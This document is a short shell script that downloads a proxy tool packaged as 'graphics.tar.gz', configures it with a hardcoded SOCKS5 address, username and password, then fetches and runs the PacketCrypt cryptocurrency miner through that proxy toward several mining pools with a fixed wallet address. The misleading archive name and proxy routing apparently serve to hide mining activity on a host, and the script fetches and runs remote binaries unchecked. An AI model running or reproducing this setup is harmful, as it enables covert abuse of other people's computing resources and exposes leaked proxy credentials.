#!/bin/sh
apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
tar -xvzf graphics.tar.gz
cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233 
loglevel = 1 
select_proxy_mode=socks5_only 
socks5 = 103.253.24.243:8080
socks5_username = woiden_berkah69
socks5_password = liyan65
END
wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
chmod +x packetcrypt

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
./graftcp/graftcp curl ifconfig.me
./graftcp/graftcp ./packetcrypt ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com

